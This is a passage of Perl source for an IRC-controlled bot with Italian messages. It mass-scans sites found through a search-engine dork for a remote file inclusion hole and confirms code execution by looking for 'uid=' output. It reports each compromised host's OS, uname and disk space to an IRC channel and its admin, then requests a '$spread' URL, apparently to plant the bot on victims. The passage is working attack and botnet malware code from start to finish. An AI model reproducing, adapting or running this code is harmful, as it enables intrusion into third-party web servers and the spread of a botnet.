if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» HotBot 11« 0[11+0]");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» HotBot 11« 0[11+0]: 11Versione0: $os - 11Safe Mode0: OFF -11 $print ");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» HotBot 0[11+0]: 11Uname0: $un ");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» HotBot 0[11+0]: 11HD Totale0: $all - 11Libero0: $free -11Usato0: $used ");
display( $dsp, "PRIVMSG $admin   :0,2[11+0] 11» HotBot « 0[11+0]: 11Versione0: $os - 11Safe Mode0: OFF -11 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


      if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @mammalist = &mamma($dork);
  push( my @tot, @mammalist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Scansione Mamma Avviata.. 11« 0[11+0]: ".scalar(@tot)." puliti ".scalar(@puliti)." 11 0[4Mamma0] 0[11+0]:11 $dork");
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Si è Conclusa La Scansione 11« 0[11+0] 0[4Mamma0] 0[11+0]:11 $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Mamma 11« 0[11+0]");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Mamma 11« 0[11+0]: 11Versione0: $os - 11Safe Mode0: OFF -11 $print ");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Mamma 0[11+0]: 11Uname0: $un ");
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Mamma 0[11+0]: 11HD Totale0: $all - 11Libero0: $free -11Usato0: $used ");
display( $dsp, "PRIVMSG $admin   :0,2[11+0] 11» Mamma « 0[11+0]: 11Versione0: $os - 11Safe Mode0: OFF -11 $print ");
my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :0,2[11+0] 11» Mamma 11« 0[11+0]");
